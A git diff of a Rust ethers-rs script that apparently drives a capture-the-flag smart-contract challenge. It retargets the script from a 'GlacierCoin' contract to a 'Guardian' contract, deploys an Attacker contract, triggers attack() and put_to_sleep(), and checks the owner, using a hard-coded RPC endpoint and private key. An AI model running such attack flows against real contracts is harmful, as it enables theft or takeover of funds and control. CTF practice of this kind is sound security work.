@@ -1,24 +1,24 @@
 use ethers::{
     core::k256::ecdsa::SigningKey,
     prelude::*,
-    utils::{hex::FromHex, parse_ether},
+    utils::{hex::FromHex}, etherscan::contract,
 };
 use std::{sync::Arc, time::Duration};
 
 abigen!(Setup, "./out/Setup.sol/Setup.json");
-abigen!(GlacierCoin, "./out/Challenge.sol/GlacierCoin.json");
+abigen!(Guardian, "./out/Guardian.sol/Guardian.json");
 abigen!(Attacker, "./out/Attacker.sol/Attacker.json");
 
 pub struct Contracts {
     setup: Setup<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
-    glacier_coin: GlacierCoin<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
+    guardian: Guardian<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
     attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
 }
 
-const RPC_URL: &str = "http://34.159.107.195:18545/17490312-1a55-4fd3-a75e-c54fc50ede22";
+const RPC_URL: &str = "http://34.159.107.195:18546/914e3e68-a154-461d-97d4-36a93854f33e";
 pub static WALLET_PRIVATE_KEY: &str =
-    "0xb3eeb8e0799e11a77fd5de7cc54bf58f1af5667626f3544e4ee054270cf36d32";
-pub static SETUP_CONTRACT_ADDRESS: &str = "0x900f3F08F331fB0E605857c7c95c6243557A0B66";
+    "0x5addb90ff56cf8d17f627d30e2afdb5db28810ce8dd77add8c9d8b8e4e54f73d";
+pub static SETUP_CONTRACT_ADDRESS: &str = "0xB28070edaBFc944c2f4C081E9384bfC3f5886b71";
 
 pub static PROVIDER: Lazy<Provider<Http>> = Lazy::new(|| {
     Provider::<Http>::try_from(RPC_URL)
@@ -48,8 +48,8 @@ pub async fn contracts() -> Contracts {
         SETUP_CONTRACT_ADDRESS.parse::<H160>().unwrap(),
         client.clone(),
     );
-    let glacier_coin: GlacierCoin<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
-        GlacierCoin::new(setup.target().call().await.unwrap(), client.clone());
+    let guardian: Guardian<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
+        Guardian::new(setup.target().call().await.unwrap(), client.clone());
     let attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
         Attacker::deploy(client.clone(), setup.address())
             .unwrap()
@@ -59,7 +59,7 @@ pub async fn contracts() -> Contracts {
 
     Contracts {
         setup,
-        glacier_coin,
+        guardian,
         attacker,
     }
 }
@@ -69,33 +69,52 @@ pub async fn contracts() -> Contracts {
 async fn main() {
     let contracts = contracts().await;
 
-    let target_balance = PROVIDER
-        .get_balance(contracts.glacier_coin.address(), None)
-        .await
-        .unwrap();
-    dbg!(target_balance);
+    dbg!(contracts.guardian.asleep().call().await.unwrap());
+    dbg!(contracts.guardian.owner().call().await.unwrap());
 
-    if target_balance != 0u32.into() {
-        let tx = contracts.attacker.attack().value(parse_ether(1).unwrap());
-        match tx.clone().send().await {
-            Ok(pending_tx) => {
-                pending_tx.await.unwrap();
-                dbg!(&PROVIDER
-                    .get_balance(contracts.glacier_coin.address(), None)
-                    .await
-                    .unwrap());
+    let tx = contracts.attacker.attack().value(1337);
+    match tx.clone().send().await {
+        Ok(pending_tx) => {
+            pending_tx.await.unwrap();
+            dbg!(contracts.guardian.asleep().call().await.unwrap());
+            dbg!(contracts.guardian.owner().call().await.unwrap());
+        }
+        Err(e) => {
+            if let Some(decoded_error) = e.decode_revert::<String>() {
+                dbg!(contracts.guardian.asleep().call().await.unwrap());
+                dbg!(contracts.guardian.owner().call().await.unwrap());
+                panic!("{}", decoded_error);
+            } else {
+                match e.as_revert() {
+                    Some(revert) => {
+                        panic!("{}", revert);
+                    }
+                    None => {
+                        panic!("{}", e);
+                    }
+                }
             }
-            Err(e) => {
-                if let Some(decoded_error) = e.decode_revert::<String>() {
-                    panic!("{}", decoded_error);
-                } else {
-                    match e.as_revert() {
-                        Some(revert) => {
-                            panic!("{}", revert);
-                        }
-                        None => {
-                            panic!("{}", e);
-                        }
+        }
+    }
+    let tx2 = contracts.guardian.put_to_sleep();
+    match tx2.clone().send().await {
+        Ok(pending_tx) => {
+            pending_tx.await.unwrap();
+            dbg!(contracts.guardian.asleep().call().await.unwrap());
+            dbg!(contracts.guardian.owner().call().await.unwrap());
+        }
+        Err(e) => {
+            if let Some(decoded_error) = e.decode_revert::<String>() {
+                dbg!(contracts.guardian.asleep().call().await.unwrap());
+                dbg!(contracts.guardian.owner().call().await.unwrap());
+                panic!("{}", decoded_error);
+            } else {
+                match e.as_revert() {
+                    Some(revert) => {
+                        panic!("{}", revert);
+                    }
+                    None => {
+                        panic!("{}", e);
                     }
                 }
             }
